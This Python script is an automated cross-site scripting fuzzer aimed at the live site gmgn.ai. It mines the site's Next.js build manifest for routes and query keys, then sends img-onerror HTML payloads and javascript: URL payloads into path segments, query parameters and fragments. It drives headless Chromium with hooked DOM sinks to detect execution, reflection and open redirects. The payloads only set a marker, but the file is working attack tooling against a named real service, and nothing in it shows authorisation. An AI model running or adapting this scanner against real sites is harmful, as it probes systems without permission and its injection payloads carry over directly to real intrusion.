from __future__ import annotations

import html
import json
import re
import shutil
import time
import urllib.error
import urllib.parse
import urllib.request
from collections import defaultdict
from pathlib import Path

from playwright.sync_api import sync_playwright

BASE = "https://gmgn.ai/"
UA = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
)
RUN = f"XSSROUTE{int(time.time())}"
HTML_PAYLOAD = (
    f'<img src=x onerror="document.documentElement.dataset.xssExecuted=\'{RUN}\'">'
)
JS_PAYLOAD = (
    f"javascript:document.documentElement.dataset.xssExecuted='{RUN}';void 0"
)
MAX_CASES = 340
WAIT_MS = 850
REDIRECT_KEY = re.compile(
    r"(?:url|uri|redirect|callback|return|next|target|href|link|continue|dest|origin)",
    re.I,
)
COMMON_KEYS = (
    "q",
    "query",
    "search",
    "keyword",
    "code",
    "state",
    "redirect",
    "redirect_url",
    "callback",
    "callback_url",
    "return_url",
    "next",
    "url",
    "target",
)


def fetch(url: str, limit: int = 10_000_000) -> tuple[int | None, bytes, str | None]:
    request = urllib.request.Request(
        url,
        headers={"User-Agent": UA, "Accept": "text/html,application/javascript,*/*"},
    )
    try:
        with urllib.request.urlopen(request, timeout=30) as response:
            return response.status, response.read(limit + 1)[:limit], None
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read(200_000), str(exc)
    except Exception as exc:  # noqa: BLE001
        return None, b"", f"{type(exc).__name__}: {exc}"


def build_manifest(page: str) -> tuple[str | None, dict[str, list[str]]]:
    match = re.search(r'["\'](/_next/static/[^"\']+/_buildManifest\.js)["\']', page)
    if not match:
        return None, {}
    url = urllib.parse.urljoin(BASE, html.unescape(match.group(1)))
    status, body, _ = fetch(url)
    if status != 200:
        return url, {}
    source = body.decode(errors="replace")
    routes: dict[str, list[str]] = {}
    for item in re.finditer(
        r'["\'](/[^"\']*)["\']\s*:\s*\[([^\]]*)\]', source
    ):
        chunks = re.findall(r'["\']([^"\']+\.js)["\']', item.group(2))
        if chunks:
            routes[item.group(1)] = [urllib.parse.urljoin(url, chunk) for chunk in chunks]
    return url, routes


def extract_query_keys(source: str) -> set[str]:
    patterns = (
        r"(?:URLSearchParams|searchParams|params)\b[^;]{0,600}?\.get\(\s*[\"']([A-Za-z0-9_.:-]{1,80})[\"']\s*\)",
        r"\.query\.([A-Za-z_$][\w$]{0,79})",
        r"\.query\[\s*[\"']([A-Za-z0-9_.:-]{1,80})[\"']\s*\]",
        r"searchParams\.([A-Za-z_$][\w$]{0,79})",
    )
    output: set[str] = set()
    for pattern in patterns:
        output.update(re.findall(pattern, source))
    return output


def safe_segment(name: str) -> str:
    lowered = name.lower()
    if lowered in {"chain", "network"}:
        return "sol"
    if any(word in lowered for word in ("address", "token", "mint", "ca")):
        return "So11111111111111111111111111111111111111112"
    if any(word in lowered for word in ("id", "uid", "order")):
        return "1"
    return "test"


def render_route(route: str, injected: str | None = None) -> str:
    used = False

    def replacement(match: re.Match[str]) -> str:
        nonlocal used
        name = match.group(1).replace("...", "")
        if injected is not None and not used:
            used = True
            return urllib.parse.quote(injected, safe="")
        return urllib.parse.quote(safe_segment(name), safe="")

    rendered = re.sub(r"\[\[?([^\]]+)\]?\]", replacement, route)
    return rendered if rendered.startswith("/") else f"/{rendered}"


def route_priority(route: str) -> int:
    score = 0
    lowered = route.lower()
    for word in (
        "callback",
        "login",
        "share",
        "referral",
        "invite",
        "profile",
        "twitter",
        "telegram",
        "ai",
        "search",
        "token",
    ):
        score += 3 if word in lowered else 0
    score += 4 if "[" in route else 0
    return score


def build_cases(routes: dict[str, list[str]]) -> tuple[list[dict], dict[str, list[str]]]:
    chunk_cache: dict[str, str] = {}
    route_keys: dict[str, list[str]] = {}
    for route, chunks in routes.items():
        keys: set[str] = set()
        for chunk_url in chunks:
            if chunk_url not in chunk_cache:
                status, body, _ = fetch(chunk_url)
                chunk_cache[chunk_url] = (
                    body.decode(errors="replace") if status == 200 else ""
                )
            keys.update(extract_query_keys(chunk_cache[chunk_url]))
        route_keys[route] = sorted(keys)

    cases: list[dict] = []
    ignored = {"/_app", "/_document", "/_error", "/404", "/500"}
    for route in sorted(routes, key=lambda item: (-route_priority(item), item)):
        if route in ignored or route.startswith("/api/"):
            continue
        path = render_route(route)
        priority = route_priority(route)

        if "[" in route:
            cases.append(
                {
                    "priority": priority + 12,
                    "route": route,
                    "kind": "dynamic_path_html",
                    "key": None,
                    "url": urllib.parse.urljoin(BASE, render_route(route, HTML_PAYLOAD)),
                }
            )

        keys = list(route_keys.get(route, []))
        if priority >= 3:
            for common in COMMON_KEYS:
                if common not in keys:
                    keys.append(common)
        keys.sort(key=lambda key: (not bool(REDIRECT_KEY.search(key)), key))

        for key in keys[:7]:
            query = urllib.parse.urlencode({key: HTML_PAYLOAD})
            cases.append(
                {
                    "priority": priority + (8 if REDIRECT_KEY.search(key) else 3),
                    "route": route,
                    "kind": "query_html",
                    "key": key,
                    "url": f"{urllib.parse.urljoin(BASE, path)}?{query}",
                }
            )
            if REDIRECT_KEY.search(key):
                query = urllib.parse.urlencode({key: JS_PAYLOAD})
                cases.append(
                    {
                        "priority": priority + 14,
                        "route": route,
                        "kind": "query_javascript_url",
                        "key": key,
                        "url": f"{urllib.parse.urljoin(BASE, path)}?{query}",
                    }
                )

        cases.append(
            {
                "priority": priority + 2,
                "route": route,
                "kind": "fragment_html",
                "key": None,
                "url": f"{urllib.parse.urljoin(BASE, path)}#{urllib.parse.quote(HTML_PAYLOAD, safe='')}",
            }
        )

    cases.sort(key=lambda item: (-item["priority"], item["route"], item["kind"], item["key"] or ""))
    return cases[:MAX_CASES], route_keys


def main() -> int:
    root_status, root_body, root_error = fetch(BASE, 3_000_000)
    page_source = root_body.decode(errors="replace")
    manifest_url, routes = build_manifest(page_source)
    cases, route_keys = build_cases(routes)

    result = {
        "generated_at": int(time.time()),
        "run_id": RUN,
        "scope": "Unauthenticated GET/browser route fuzzing with harmless DOM markers only",
        "root": {"status": root_status, "error": root_error},
        "manifest": {"url": manifest_url, "route_count": len(routes)},
        "route_query_keys": route_keys,
        "case_count": len(cases),
        "browser_launched": False,
        "executions": [],
        "sink_hits": [],
        "reflections": [],
        "navigation_changes": [],
        "status_counts": defaultdict(int),
        "errors": [],
    }

    chrome = next(
        (
            shutil.which(name)
            for name in ("google-chrome", "google-chrome-stable", "chromium", "chromium-browser")
            if shutil.which(name)
        ),
        None,
    )

    init_script = f"""
    (() => {{
      const marker = {json.dumps(RUN)};
      const note = (kind, value) => {{
        try {{
          if (String(value).includes(marker)) {{
            const root = document.documentElement;
            const old = root.dataset.xssSink || '';
            root.dataset.xssSink = old ? old + ',' + kind : kind;
          }}
        }} catch (_) {{}}
      }};
      const originalOpen = window.open;
      window.open = function(url, ...rest) {{ note('window.open', url); return originalOpen.call(this, url, ...rest); }};
      const originalWrite = document.write.bind(document);
      document.write = function(...args) {{ args.forEach(value => note('document.write', value)); return originalWrite(...args); }};
      const originalInsert = Element.prototype.insertAdjacentHTML;
      Element.prototype.insertAdjacentHTML = function(position, value) {{ note('insertAdjacentHTML', value); return originalInsert.call(this, position, value); }};
      const descriptor = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
      if (descriptor && descriptor.set && descriptor.get) {{
        Object.defineProperty(Element.prototype, 'innerHTML', {{
          configurable: descriptor.configurable,
          enumerable: descriptor.enumerable,
          get: descriptor.get,
          set(value) {{ note('innerHTML', value); return descriptor.set.call(this, value); }}
        }});
      }}
      const originalSetAttribute = Element.prototype.setAttribute;
      Element.prototype.setAttribute = function(name, value) {{
        if (['srcdoc','src','href'].includes(String(name).toLowerCase())) note('setAttribute:' + name, value);
        return originalSetAttribute.call(this, name, value);
      }};
      const OriginalFunction = window.Function;
      window.Function = function(...args) {{ args.forEach(value => note('Function', value)); return OriginalFunction(...args); }};
    }})();
    """

    with sync_playwright() as playwright:
        launch_options = {
            "headless": True,
            "args": [
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--disable-extensions",
                "--no-first-run",
                "--disable-popup-blocking",
            ],
        }
        if chrome:
            launch_options["executable_path"] = chrome
        browser = playwright.chromium.launch(**launch_options)
        result["browser_launched"] = True
        context = browser.new_context(user_agent=UA, locale="en-US", timezone_id="UTC")
        context.add_init_script(init_script)
        browser_page = context.new_page()
        browser_page.set_default_navigation_timeout(15_000)

        for index, case in enumerate(cases, start=1):
            try:
                response = browser_page.goto(
                    case["url"], wait_until="domcontentloaded", timeout=15_000
                )
                status = response.status if response else None
                result["status_counts"][str(status)] += 1
                browser_page.wait_for_timeout(WAIT_MS)
                state = browser_page.evaluate(
                    """marker => ({
                      executed: document.documentElement.dataset.xssExecuted || '',
                      sinks: document.documentElement.dataset.xssSink || '',
                      reflected: document.documentElement.innerHTML.includes(marker),
                      href: location.href
                    })""",
                    RUN,
                )
                compact = {
                    "index": index,
                    "route": case["route"],
                    "kind": case["kind"],
                    "key": case["key"],
                    "status": status,
                }
                if state.get("executed") == RUN:
                    result["executions"].append(compact)
                if state.get("sinks"):
                    result["sink_hits"].append({**compact, "sinks": state["sinks"]})
                if state.get("reflected"):
                    result["reflections"].append(compact)
                requested = urllib.parse.urlsplit(case["url"])
                landed = urllib.parse.urlsplit(state.get("href") or "")
                if (requested.scheme, requested.netloc, requested.path) != (
                    landed.scheme,
                    landed.netloc,
                    landed.path,
                ):
                    result["navigation_changes"].append(
                        {
                            **compact,
                            "landed_scheme": landed.scheme,
                            "landed_host": landed.hostname,
                            "landed_path": landed.path,
                        }
                    )
            except Exception as exc:  # noqa: BLE001
                result["errors"].append(
                    {
                        "index": index,
                        "route": case["route"],
                        "kind": case["kind"],
                        "key": case["key"],
                        "error": f"{type(exc).__name__}: {exc}",
                    }
                )

        context.close()
        browser.close()

    result["status_counts"] = dict(result["status_counts"])
    result["summary"] = {
        "routes": len(routes),
        "cases": len(cases),
        "executions": len(result["executions"]),
        "sink_hits": len(result["sink_hits"]),
        "reflections": len(result["reflections"]),
        "navigation_changes": len(result["navigation_changes"]),
        "errors": len(result["errors"]),
    }
    Path("gmgn_route_xss_fuzz_report.json").write_text(
        json.dumps(result, indent=2, ensure_ascii=False), encoding="utf-8"
    )
    print(json.dumps(result["summary"], indent=2))
    for key in ("executions", "sink_hits", "reflections", "navigation_changes"):
        for item in result[key][:50]:
            print(key.upper(), json.dumps(item, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
